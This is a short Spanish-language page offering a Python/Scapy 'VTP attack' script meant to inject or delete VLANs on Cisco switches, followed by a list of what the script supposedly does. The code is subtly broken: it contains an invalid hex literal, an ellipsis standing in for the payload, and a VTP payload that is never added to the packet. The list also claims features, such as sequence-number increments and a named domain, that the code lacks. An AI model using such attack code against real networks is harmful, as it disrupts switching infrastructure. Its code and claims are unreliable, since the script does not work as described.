# Script-VTP-Attacks-Agregue-una-VLAN-y-Borre-una-VLAN
python
#!/usr/bin/env python3
from scapy.all import *
import time
import sys
def vtp_vlan_add(interface, domain_name, vlan_id, vlan_name):
 """Ataque VTP para agregar una VLAN"""

 # MAC destino VTP (multicast)
 dst_mac = "01:80:0c:cc:cc:cc"
 src_mac = get_if_hwaddr(interface)

 # Crear frame Ethernet
 pkt = Ether(dst=dst_mac, src=src_mac, type=0x8100)

 # VLAN tag (sin tagear, nativa)
 pkt /= Dot1Q(vlan=1, type=0x8137)

 # LLC
 pkt /= LLC(dsap=0xap, ssap=0xaa, ctrl=0x03)

 # SNAP
 pkt /= SNAP(OUI=0x00000c, code=0x2003)

 # VTP Header (versión 2)
 vtp_header = bytes([
 0x02, # VTP version 2
 0x01, # VTP type: Summary Advertisement
 0x00, # Reserved
 len(domain_name), # Longitud del dominio
 ])

 # Domain name
 domain_bytes = domain_name.encode()

 # VTP Packet
 vtp_summary = vtp_header + domain_bytes + ...

 # Enviar
 send(pkt)
Lo que hace el script:
1. Construye paquetes Ethernet válidos
2. Usa VLAN tag de administración (VLAN 1)
3. Encapsula VTP versión 2
4. Especifica dominio ITLA
5. Incrementa números de secuencia para parecer legítimo
Script VTP Attacks: Agregue una VLAN y Borre una VLAN
